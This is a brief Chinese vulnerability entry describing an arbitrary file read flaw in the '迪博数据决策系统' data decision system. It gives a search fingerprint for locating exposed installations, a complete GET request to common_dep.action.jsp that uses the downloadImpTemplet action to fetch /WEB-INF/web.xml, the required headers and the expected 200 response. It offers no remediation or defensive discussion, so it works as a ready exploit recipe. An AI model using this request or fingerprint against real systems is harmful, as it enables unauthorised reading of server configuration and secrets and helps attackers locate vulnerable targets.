# 迪博数据决策系统downloadImpTemplet存在任意文件读取漏洞

- **系统**：迪博数据决策系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="common/dep/dep/Core.js"`
- **请求**：`GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=12 HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=`　`Sec-Fetch-User: ?1`　`Sec-Gpc: 1`　`Priority: u=0, i`
- **预期**：200　|　—